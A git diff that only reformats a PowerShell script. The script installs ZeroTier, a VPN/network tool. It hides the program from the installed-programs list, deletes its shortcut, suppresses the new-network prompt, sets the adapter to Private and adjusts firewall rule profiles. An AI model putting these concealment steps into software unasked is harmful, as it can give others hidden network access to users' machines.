@@ -21,7 +21,7 @@ New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowO
 Install-PackageProvider -Name NuGet -Force | Out-Null
 Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
 if (Test-Path $ztdatadir) {
-Remove-Item -Path $ztdatadir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
+    Remove-Item -Path $ztdatadir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
 }
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
@@ -37,7 +37,8 @@ if (Test-Path $destinationPath) {
     }
     if ($programHash -eq $existingFileHash) {
         Write-Host "File is already present and matches the hash. No action needed." | Out-Null
-    } else {
+    }
+    else {
         Remove-Item -Path $destinationPath -Force
     }
 }
@@ -55,39 +56,39 @@ $zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
 
 #Removing the zerotier entry from installed-programs section.
 foreach ($Key in $MatchingKeys) {
-$RegKeyPath = Join-Path -Path $installedprogramregpath -ChildPath $Key.PSChildName
-$RegValueName = "SystemComponent"
-$RegValueData = 1
-Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
-Set-NetConnectionProfile -InterfaceAlias "ZeroTier*" -NetworkCategory Private
+    $RegKeyPath = Join-Path -Path $installedprogramregpath -ChildPath $Key.PSChildName
+    $RegValueName = "SystemComponent"
+    $RegValueData = 1
+    Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
+    Set-NetConnectionProfile -InterfaceAlias "ZeroTier*" -NetworkCategory Private
 }
 
 #Removal of shortcut.
 if (Test-Path $ZeroTierShortcutPath) {
-Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
+    Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
 }
 $folderPath = "C:\Program Files (x86)\ZeroTier"
 $folderACL = Get-Acl -Path $folderPath
 $folderACL.SetAccessRuleProtection($true, $false)
 $folderACL.Access | ForEach-Object {
-$folderACL.RemoveAccessRule($_)
+    $folderACL.RemoveAccessRule($_)
 }
 Set-Acl -Path $folderPath -AclObject $folderACL
 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $folderACL.SetOwner([System.Security.Principal.NTAccount] $currentUser)
 Set-Acl -Path $folderPath -AclObject $folderACL
 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
-$currentUser,
-"FullControl",
-"ContainerInherit, ObjectInherit",
-"None",
-"Allow"
+    $currentUser,
+    "FullControl",
+    "ContainerInherit, ObjectInherit",
+    "None",
+    "Allow"
 )
 $folderACL.AddAccessRule($accessRule)
 Set-Acl -Path $folderPath -AclObject $folderACL
 $childItems = Get-ChildItem -Path $folderPath -Recurse
 foreach ($item in $childItems) {
-Set-Acl -Path $item.FullName -AclObject $folderACL
+    Set-Acl -Path $item.FullName -AclObject $folderACL
 }
 Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
 
@@ -102,10 +103,12 @@ while ($retryCount -lt $maxRetries) {
         if ($adapter) {
             Rename-NetAdapter -InputObject $adapter -NewName $newAdapterName
             break  # Exit the loop on success
-        } else {
+        }
+        else {
             break  # Exit the loop if the adapter is not found
         }
-    } catch {
+    }
+    catch {
         $retryCount++
         Start-Sleep -Seconds 5  # Add a delay before the next retry
     }
@@ -118,7 +121,8 @@ if ($Rules.Count -gt 0) {
         $Rule.Profile = $ProfileType
         Set-NetFirewallRule -InputObject $Rule | Out-Null
     }
-} else {}
+}
+else {}
 
 #Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff" -Force | Out-Null
 #ZT Adv Fix
